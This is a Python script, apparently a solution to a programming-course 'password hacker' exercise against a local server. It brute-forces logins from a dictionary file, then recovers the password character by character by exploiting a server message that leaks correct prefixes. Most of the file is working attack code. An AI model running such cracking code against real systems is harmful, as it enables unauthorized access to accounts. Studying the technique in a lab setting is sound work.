from itertools import chain
import json
import socket
from string import ascii_letters

from cracking import dictionary_attack


def get_response(address, message, response_length=4096):
    """
    Send a message to a server socket and return the response.

    Sends a specified message to a server socket and return the response
    with a maximum length of response_length [default 4096 Bytes]

    :param address: Server address, Tuple (IP, port)
    :param message: Message to be send. Needs to be a String.
    :param response_length: Maximum number of bytes to be received.
    :return: Server response as string.
    """
    with socket.socket() as client:
        client.connect(address)
        client.send(message.encode())
        response = client.recv(response_length)
        return response.decode()


def get_password(address, method, response_length=4096, success_message="Connection success!",
                 fail_message="Wrong password!"):
    """
    Connect to the server and attempt to crack the password.

    Attempt to find the server password with the specified method and return it.
    :param address: Server address, Tuple (IP, port)
    :param method: Cracking method, generator function for password strings
    :param response_length: Maximum number of bytes to be received.
    :param success_message: server response for correct password
    :param fail_message: server response for incorrect password
    :return: Found password
    """
    with socket.socket() as client:
        client.connect(address)
        for password in method:
            client.send(password.encode())
            response = client.recv(response_length).decode()
            if response == success_message:
                return password
            elif response == fail_message:
                continue
            elif response == "Too many attempts":
                # something went wrong
                return response


def _send_recv_json(client_socket, message, response_length):
    """
    Return the servers response to a send JSON message.

    Send a JSON encoded message to the server, receive the JSON encoded answer and return the decoded answer.
    :param client_socket: Socket to send and receive messages.
    :param message: Message to be send. Able to be encoded into a JSON string.
    :param response_length: Maximal length of response to be received.
    :return: Server response, already decoded to a dictionary
    """
    client_socket.send(json.dumps(message).encode())
    return json.loads(client_socket.recv(response_length).decode())


def get_password_json(address, response_length=4096, timed=False):
    """
    Return the login information of the server by brute force methods.

    Find the login name via brute force dictionary attack.
    Find the password via brute force guessing and a security gap on the server. The server responds with
    "Exception happened during login", if the guessed password matches the prefix of the real password.
    :param address: Server address, Tuple (IP, port)
    :param response_length: Maximum number of bytes to be received.
    :param timed: Whether to use time as a measurement for a correct guess. Needed for stage 5.
    :return: Login information encoded as JSON string.
    """
    with socket.socket() as client:
        client.connect(address)

        # find login
        login_dict = {"login": "", "password": " "}
        for login in dictionary_attack("logins.txt"):
            login_dict["login"] = login
            response = _send_recv_json(client, login_dict, response_length)["result"]
            # correct login, wrong password
            if response == "Wrong password!":
                break

        # find password
        password_letters = list(chain(ascii_letters, map(str, range(10))))
        login_dict["password"] = ""
        while response != "Connection success!":
            correct_part = login_dict["password"]
            for letter in password_letters:
                login_dict["password"] = correct_part + letter
                response = _send_recv_json(client, login_dict, response_length)["result"]
                if response == "Exception happened during login" or response == "Connection success!":
                    break

        return json.dumps(login_dict, indent=4)


if __name__ == '__main__':
    print(get_password_json(("localhost", 9090)))
